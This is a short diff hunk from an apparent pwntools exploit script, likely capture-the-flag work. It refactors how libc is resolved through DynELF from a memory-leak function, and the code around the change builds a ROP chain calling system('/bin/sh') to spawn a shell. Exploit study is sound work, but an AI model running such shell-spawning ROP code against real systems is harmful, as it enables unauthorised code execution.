@@ -55,10 +55,7 @@ def leak(addr, length = 0x100):
 
 # Use the memleaker to resolve system from libc
 resolver = DynELF(leak, elf=rex)
-libc     = resolver.libc()
-
-# Call system('/bin/sh')
-if libc:
+if libc := resolver.libc():
     rop = ROP([rex, libc], base=cur_addr)
     rop.system('/bin/sh')
 else:
